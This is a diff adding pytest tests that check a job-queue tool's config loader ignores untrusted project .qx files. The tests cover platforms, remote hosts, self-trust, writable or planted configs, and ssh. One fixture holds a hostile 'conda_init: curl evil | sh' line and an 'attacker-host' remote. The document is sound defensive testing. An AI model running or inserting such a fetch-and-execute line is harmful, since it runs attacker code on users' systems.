@@ -198,3 +198,125 @@ def test_a_symlinked_user_config_keeps_its_link(home, loose_umask):
     assert (config_dir / "config.yaml").is_symlink()
     assert "name: x" in target.read_text()
     assert _mode(target) == 0o600
+
+
+# -- project (.qx) config --------------------------------------------------------
+
+REMOTE_PROJECT = """\
+defaults:
+  platform: evil
+  queue: express
+platform_search_paths: [/tmp/evil-platforms]
+platforms:
+  evil:
+    remote:
+      host: attacker-host
+      working_dir: /tmp
+      conda_init: curl evil | sh
+  mine:
+    remote:
+      host: attacker-host
+      working_dir: /tmp
+"""
+
+
+def _write_project(work: Path, text: str, name: str = "project.yaml") -> Path:
+    qx = work / ".qx"
+    qx.mkdir(exist_ok=True)
+    path = qx / name
+    path.write_text(text)
+    return path
+
+
+def _write_user_config(root: Path, text: str) -> None:
+    config_dir = root / "home" / ".config" / "qxub"
+    config_dir.mkdir(exist_ok=True)
+    (config_dir / "config.yaml").write_text(text)
+
+
+@pytest.mark.parametrize("name", ["project.yaml", "local.yaml", "test.yaml"])
+def test_project_config_cannot_choose_where_jobs_run(home, capsys, name):
+    _write_user_config(home, "platforms:\n  mine:\n    definition: /x.yaml\n")
+    _write_project(home / "work", REMOTE_PROJECT, name)
+
+    cm = ConfigManager()
+    assert cm.get_default_platform_name() is None
+    assert cm.get_platform_config("evil") is None
+    assert cm.get_platform_config("mine") == {"definition": "/x.yaml"}
+    assert Path("/tmp/evil-platforms") not in cm.get_platform_search_paths()
+    # Ordinary defaults still apply
+    assert cm.get_defaults()["queue"] == "express"
+    err = capsys.readouterr().err
+    assert "platforms" in err and "defaults.platform" in err
+    assert "platform_search_paths" in err
+
+
+def test_a_trusted_project_may_choose_where_jobs_run(home):
+    _write_user_config(home, f"security:\n  trusted_projects: [{home / 'work'}]\n")
+    _write_project(home / "work", REMOTE_PROJECT)
+
+    cm = ConfigManager()
+    assert cm.get_default_platform_name() == "evil"
+    assert cm.get_platform_config("evil")["remote"]["host"] == "attacker-host"
+
+
+def test_a_project_cannot_trust_itself(home):
+    _write_project(
+        home / "work",
+        REMOTE_PROJECT + f"security:\n  trusted_projects: [{home / 'work'}]\n",
+    )
+    cm = ConfigManager()
+    assert cm.get_platform_config("evil") is None
+    assert cm.get_config_value("security") is None
+
+
+@pytest.mark.parametrize("target", ["dir", "file"])
+def test_writable_project_config_is_ignored(home, capsys, target):
+    path = _write_project(home / "work", "defaults:\n  queue: express\n")
+    (path.parent if target == "dir" else path).chmod(0o777)
+    try:
+        assert ConfigManager().get_defaults().get("queue") is None
+        assert "writable by group or others" in capsys.readouterr().err
+    finally:
+        path.parent.chmod(0o755)
+        path.chmod(0o644)
+
+
+def test_a_planted_qx_in_a_parent_directory_is_ignored(home):
+    # As in /tmp: a world-writable (sticky) parent holding someone's .qx
+    shared = home / "shared"
+    shared.mkdir()
+    qx = shared / ".qx"
+    qx.mkdir()
+    (qx / "project.yaml").write_text("defaults:\n  queue: express\n")
+    qx.chmod(0o777)
+    sub = shared / "victim"
+    sub.mkdir()
+    os.chdir(sub)
+    try:
+        assert ConfigManager().get_defaults().get("queue") is None
+    finally:
+        qx.chmod(0o755)
+
+
+def test_exec_does_not_ssh_for_a_cloned_projects_platform(sandbox, tmp_path):
+    bin_dir = tmp_path / "fake-ssh"
+    bin_dir.mkdir()
+    marker = tmp_path / "ssh-called"
+    ssh = bin_dir / "ssh"
+    ssh.write_text(f'#!/bin/sh\necho "$@" > {marker}\n')
+    ssh.chmod(0o755)
+    env = {"PATH": f"{bin_dir}:{sandbox.env['PATH']}"}
+    project = "defaults:\n  platform: evil\nplatforms:\n  evil:\n    remote:\n"
+    project += "      host: attacker-host\n      working_dir: /tmp\n"
+
+    _write_project(sandbox.cwd, project)
+    result = sandbox.run("exec", "--dry-run", "--", "true", env=env)
+    assert not marker.exists(), result.stderr
+    assert "Ignoring" in result.stderr
+
+    # Control: the same platform in the user's own config does use ssh
+    (sandbox.cwd / ".qx" / "project.yaml").unlink()
+    sandbox.write_config(project)
+    sandbox.run("exec", "--dry-run", "--", "true", env=env)
+    assert "attacker-host" in marker.read_text()
